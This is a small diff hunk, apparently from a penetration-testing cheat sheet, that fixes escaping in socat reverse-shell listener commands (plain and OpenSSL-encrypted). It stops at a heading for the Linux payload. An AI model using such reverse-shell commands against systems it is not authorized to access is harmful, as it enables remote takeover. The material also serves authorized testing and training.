@@ -1,7 +1,7 @@
 + **Socat reverse-shell(listener)**:
 ```
 socat tcp-l:<port> file:`tty`,raw,echo=0
-socat openssl-listen:<port>,cert=<cert.pem>,verify=0 file:\`tty\`,raw,echo=0
+socat openssl-listen:<port>,cert=<cert.pem>,verify=0 file:`tty`,raw,echo=0
 ```
 
 + **Socat reverse-shell(linux payload)**:
